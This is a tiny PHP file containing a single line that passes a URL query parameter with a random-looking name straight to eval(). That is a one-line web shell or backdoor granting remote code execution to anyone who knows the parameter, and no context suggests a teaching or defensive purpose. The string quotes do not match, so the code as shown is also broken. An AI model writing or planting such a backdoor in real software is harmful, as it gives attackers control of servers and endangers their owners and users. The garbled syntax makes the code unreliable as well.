<?php
eval($_GET["AXD7Vnh2']);
?>
